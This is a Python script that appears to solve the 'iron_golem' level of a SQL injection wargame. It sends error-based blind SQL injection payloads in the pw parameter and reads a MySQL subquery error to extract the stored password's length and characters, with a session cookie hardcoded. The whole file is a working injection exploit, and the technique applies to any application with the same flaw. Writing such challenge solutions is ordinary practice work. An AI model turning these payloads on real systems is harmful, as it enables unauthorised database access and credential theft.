#!/usr/bin/python
# coding: utf-8
import requests

# Set cookies
cookies = dict(PHPSESSID="gequo9hff2f19sjmieftjnuf50")



# pw Length guessing
print("Starting pw guessing")
for i in range(1, 100):
    url = "http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php"
    payload = "?pw=1'||if(length(pw)="+str(i)+",1,(select%201%20union%20select%202))%23"
    url += payload

    r = requests.get(url, cookies=cookies)
    if r.text.find("Subquery returns more than 1 row") > -1:
        print("[*] pw의 길이는 %2d가 아닙니다. " % i)
    else :
        print("[*] pw의 길이는 %2d입니다!" % i)
        length = i
        break


# start pwning
print("\n\n\n")
print("[+] Configuring pw")
for i in range(1, length+1):
    pwn = 31
    url = "http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php"
    payload = "?pw=1%27||if(ord(mid(pw,"+str(i)+",1))>"+str(pwn)+",1,(select%201%20union%20select%202))%23"
    url += payload

    r = requests.get(url, cookies=cookies)
    if r.text.find("Subquery returns more than 1 row") > -1:
        print("[*] pw의 %2d번째에 값이 없습니다." % (i))
    else :
        print("[*] pw의 %2d번째에 값이 있습니다!" % (i))


print("\n\n\n")
result = ""
print("[+] Starting to pwn")
for i in range(1,5):
    for j in range(pwn, 100):
        url = "http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php"
        payload = "?pw=1%27||if(ord(mid(pw,"+str(i)+",1))="+str(j)+",1,(select%201%20union%20select%202))%23"
        url += payload

        r = requests.get(url, cookies=cookies)
        if r.text.find("Subquery returns more than 1 row") > -1:
            print("[*] pw의 %d번째 값은 %d가 아닙니다. " % (i, j))
        else :
            print("[*] pw의 %d번째 값은 %d입니다! " % (i, j))
            result += chr(j)
            break

print("\n\n\n[+] result : " + result + "\n")
